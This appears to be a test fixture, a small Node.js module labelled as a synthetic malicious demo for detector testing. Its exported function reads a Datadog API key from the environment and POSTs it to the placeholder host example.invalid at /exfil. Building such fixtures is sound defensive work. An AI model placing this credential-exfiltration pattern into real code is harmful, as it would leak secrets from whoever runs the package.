/** E2E -- synthetic malicious demo (do not merge). Credential-style exfil shape for detectors only. */
const https = require('https');
module.exports = function syntheticMalicious() {
  const secret = process.env.DATADOG_API_KEY || process.env.DD_API_KEY || '';
  https
    .request(
      { hostname: 'example.invalid', method: 'POST', path: '/exfil', headers: { 'Content-Length': String(secret.length) } },
      () => {},
    )
    .end(secret);
};
